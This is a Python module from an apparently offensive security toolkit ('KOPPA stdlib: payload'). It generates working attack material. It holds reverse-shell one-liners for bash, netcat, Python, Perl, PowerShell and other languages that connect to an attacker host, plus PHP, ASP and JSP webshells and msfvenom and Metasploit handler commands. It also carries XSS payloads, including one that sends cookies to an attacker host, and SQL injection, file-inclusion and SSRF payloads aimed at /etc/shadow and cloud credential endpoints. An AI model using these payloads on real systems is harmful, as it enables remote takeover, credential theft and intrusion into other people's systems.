"""KOPPA stdlib: payload — reverse shells, droppers, and payload encoding."""
import base64, urllib.parse, json


_REVSHELLS = {
    "bash":   "bash -i >& /dev/tcp/{h}/{p} 0>&1",
    "bash2":  "0<&196;exec 196<>/dev/tcp/{h}/{p}; sh <&196 >&196 2>&196",
    "sh":     "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {h} {p} >/tmp/f",
    "nc":     "nc -e /bin/sh {h} {p}",
    "nc2":    "nc -c sh {h} {p}",
    "python": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{h}\",{p}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
    "python2":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{h}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
    "perl":   "perl -e 'use Socket;$i=\"{h}\";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    "php":    "php -r '$sock=fsockopen(\"{h}\",{p});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "ruby":   "ruby -rsocket -e'f=TCPSocket.open(\"{h}\",{p}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "powershell": "$client=New-Object System.Net.Sockets.TCPClient('{h}',{p});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    "java":   "Runtime r=Runtime.getRuntime();String[] commands=new String[]{{\"cmd\",\"/c\",\"bash -i >& /dev/tcp/{h}/{p} 0>&1\"}};Process p=r.exec(commands);",
    "golang": "package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{h}:{p}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}",
    "awk":    "awk 'BEGIN {{s = \"/inet/tcp/0/{h}/{p}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c) }} }} while(c != \"exit\") }}}}' /dev/null",
    "lua":    "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{h}','{p}');os.execute('/bin/sh -i <&3 >&3 2>&3')\"",
    "socat":  "socat tcp-connect:{h}:{p} exec:'bash -li',pty,stderr,setsid,sigint,sane",
}

_WEBSHELLS = {
    "php":   "<?php system($_GET['cmd']); ?>",
    "php2":  "<?php echo shell_exec($_REQUEST['cmd']); ?>",
    "php3":  "<?php @eval(base64_decode($_POST['cmd'])); ?>",
    "asp":   "<%=CreateObject(\"WScript.Shell\").Exec(Request(\"cmd\")).StdOut.ReadAll()%>",
    "aspx":  "<%@ Page Language=\"C#\" %><% Response.Write(new System.Diagnostics.Process().StartInfo.FileName=Request[\"cmd\"]); %>",
    "jsp":   "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
}


def reverse_shell(shell_type, lhost, lport):
    template = _REVSHELLS.get(shell_type.lower(), _REVSHELLS["bash"])
    return template.replace("{h}", str(lhost)).replace("{p}", str(lport))

def all_revshells(lhost, lport):
    return {k: reverse_shell(k, lhost, lport) for k in _REVSHELLS}

def webshell(shell_type="php"):
    return _WEBSHELLS.get(shell_type.lower(), _WEBSHELLS["php"])

def encode(data, enc_type):
    if enc_type == "base64":
        return base64.b64encode(data.encode()).decode()
    if enc_type == "url":
        return urllib.parse.quote(data, safe="")
    if enc_type == "hex":
        return data.encode().hex()
    if enc_type == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in data)
    if enc_type == "html":
        return data.replace("<", "&lt;").replace(">", "&gt;")
    return data

def msfvenom(lhost, lport, platform="linux", arch="x64",
             payload_type="reverse_tcp", fmt="elf", out="/tmp/payload"):
    payload_map = {
        "linux":   f"linux/{arch}/meterpreter/{payload_type}",
        "windows": f"windows/{arch}/meterpreter/{payload_type}",
        "osx":     f"osx/{arch}/meterpreter/{payload_type}",
        "android": f"android/meterpreter/{payload_type}",
        "php":     f"php/meterpreter/{payload_type}",
        "python":  f"python/meterpreter/{payload_type}",
    }
    p = payload_map.get(platform.lower(), payload_map["linux"])
    return f"msfvenom -p {p} LHOST={lhost} LPORT={lport} -f {fmt} -o {out}"

def msf_handler(lhost, lport, payload_type="linux/x64/meterpreter/reverse_tcp"):
    return "\n".join([
        "use exploit/multi/handler",
        f"set payload {payload_type}",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        "set ExitOnSession false",
        "run -j",
    ])

def xss_payloads(lhost="", lport=""):
    base = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "';alert(1)//",
        "\";alert(1)//",
        "<body onload=alert(1)>",
    ]
    if lhost:
        base.append(
            f"<script>new Image().src='http://{lhost}:{lport}/?c='+encodeURIComponent(document.cookie)</script>"
        )
    return base

def sqli_payloads(style="error"):
    sets = {
        "error": ["'", "\"", "' OR '1'='1", "' OR 1=1--",
                  "1 ORDER BY 99--", "' UNION SELECT NULL--",
                  "1 AND 1=2", "' AND SLEEP(0)--"],
        "union": [f"' UNION SELECT {','.join(['NULL']*i)}--" for i in range(1, 6)],
        "time":  ["' OR SLEEP(5)--", "1; SELECT SLEEP(5)--",
                  "'; WAITFOR DELAY '0:0:5'--"],
        "blind": ["' AND 1=1--", "' AND 1=2--",
                  "' AND substring(version(),1,1)='5'--"],
        "waf":   ["' /*!OR*/ '1'='1", "' OR/**/'1'='1",
                  "%27%20OR%201%3D1--"],
    }
    return sets.get(style, sets["error"])

def lfi_payloads():
    return [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id",
        "file:///etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "../../../../../../../../etc/passwd",
    ]

def ssrf_payloads(lhost=""):
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://192.168.0.1/",
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
        "file:///etc/passwd",
        "http://0/",
        "http://2130706433/",
    ]
    if lhost:
        payloads.append(f"http://{lhost}/ssrf-test")
    return payloads
